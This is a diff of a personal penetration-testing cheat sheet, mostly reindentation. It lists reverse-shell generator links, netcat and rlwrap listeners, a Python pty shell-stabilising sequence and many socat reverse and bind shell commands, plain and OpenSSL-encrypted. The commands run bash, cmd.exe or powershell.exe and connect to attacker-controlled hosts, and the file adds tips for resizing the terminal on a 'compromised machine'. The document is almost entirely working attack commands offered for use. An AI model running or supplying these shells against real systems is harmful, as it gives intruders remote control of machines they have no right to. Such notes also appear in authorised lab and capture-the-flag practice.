@@ -1,19 +1,19 @@
 ______________________________________________________________________________________
 REVERSE SHELL LISTS/GENERATORS
 
-https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#socat
-https://github.com/0dayCTF/reverse-shell-generator
+  https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#socat
+  https://github.com/0dayCTF/reverse-shell-generator
 
 ______________________________________________________________________________________
 SHELLS AND STABILIZING METHODS
   rlwrap method:
-rlwrap nc -lvnp <PORT>
+    rlwrap nc -lvnp <PORT>
 
   python improved shell method:
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-(ON REMOTE) export TERM=xterm
-(ON LOCAL, WITH SHELL BACKGROUNDED) stty raw -echo; fg;
-(WHEN DONE) reset
+    python3 -c 'import pty;pty.spawn("/bin/bash")'
+    (ON REMOTE) export TERM=xterm
+    (ON LOCAL, WITH SHELL BACKGROUNDED) stty raw -echo; fg;
+    (WHEN DONE) reset
 
   socat basic revshell listener:     socat TCP-L:[LPORT]
   socat basic reverse shell windows: socat TCP:[LHOST]:[LPORT] EXEC:powershell.exe,pipes
@@ -23,37 +23,39 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
   socat basic bind shell linux:      socat TCP-L:[RPORT] EXEC:"bash -li"
   connect to socat bind shell:       socat TCP:[RHOST]:[RPORT]
 
-    linux:
-  socat stable revshell listener:    socat TCP-L:[LPORT] FILE:`tty`,raw,echo=0
-  socat stable revshell:             socat TCP:[LHOST]:[LPORT] EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+  linux:
+    socat stable revshell listener:    socat TCP-L:[LPORT] FILE:`tty`,raw,echo=0
+    socat stable revshell:             socat TCP:[LHOST]:[LPORT] EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 
-    generate encryption keys:
-  openssl req --newkey rsa:2048 -nodes -keyout [.key file] -x509 -days 362 -out [.crt file];
-  cat [.key file] [.crt file] > [.pem file];
-  
-    encrypted socat reverse shell:
-  listener:     socat OPENSSL-LISTEN:[LPORT],cert=[certfile],verify=0 -
-  connect back: socat OPENSSL:[LHOST]:[LPORT],verify=0 EXEC:/bin/bash
+  generate encryption keys:
+    openssl req --newkey rsa:2048 -nodes -keyout [.key file] -x509 -days 362 -out [.crt file];
+    cat [.key file] [.crt file] > [.pem file];
+    
+  encrypted socat reverse shell:
+    listener:     socat OPENSSL-LISTEN:[LPORT],cert=[certfile],verify=0 -
+    connect back: socat OPENSSL:[LHOST]:[LPORT],verify=0 EXEC:/bin/bash
 
-    encrypted stable socat reverse shell:
-  listener:     socat OPENSSL-LISTEN:[LPORT],cert=[certfile],verify=0 FILE:`tty`,raw,echo=0
-  connect back: socat OPENSSL:[LHOST]:[LPORT],verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+  (windows socat shells will not be stable)
+  encrypted stable socat reverse shell:
+    listener:     socat OPENSSL-LISTEN:[LPORT],cert=[certfile],verify=0 FILE:`tty`,raw,echo=0
+    connect back: socat OPENSSL:[LHOST]:[LPORT],verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 
-    encrypted socat bind shell:
-  windows listener: socat OPENSSL-LISTEN:[RPORT],cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
-  linux listener:   socat OPENSSL-LISTEN:[RPORT],cert=shell.pem,verify=0 EXEC:"bash -li"
-  connect back:     socat OPENSSL:[RHOST]:[RPORT],verify=0 -
+  encrypted socat bind shell:
+    windows listener: socat OPENSSL-LISTEN:[RPORT],cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+    linux listener:   socat OPENSSL-LISTEN:[RPORT],cert=shell.pem,verify=0 EXEC:"bash -li"
+    connect back:     socat OPENSSL:[RHOST]:[RPORT],verify=0 -
 
-    encrypted stable socat bind shell:
-  windows listener: socat OPENSSL-LISTEN:[RPORT],cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
-  linux listener:   socat OPENSSL-LISTEN:[RPORT],cert=shell.pem,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
-  connect back:     socat OPENSSL:[RHOST]:[RPORT],verify=0 FILE:`tty`,raw,echo=0
-  
+  (windows socat shells will not be stable)
+  encrypted stable socat bind shell:
+    windows listener: socat OPENSSL-LISTEN:[RPORT],cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+    linux listener:   socat OPENSSL-LISTEN:[RPORT],cert=shell.pem,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+    connect back:     socat OPENSSL:[RHOST]:[RPORT],verify=0 FILE:`tty`,raw,echo=0
+    
 ______________________________________________________________________________________
 CHANGE TERMINAL SIZE
 
-open alternate terminal on attacker machine and run: stty -a
-on compromised machine use: stty [rows/cols] [number]
+  open alternate terminal on attacker machine and run: stty -a
+  on compromised machine use: stty [rows/cols] [number]
 
 
 
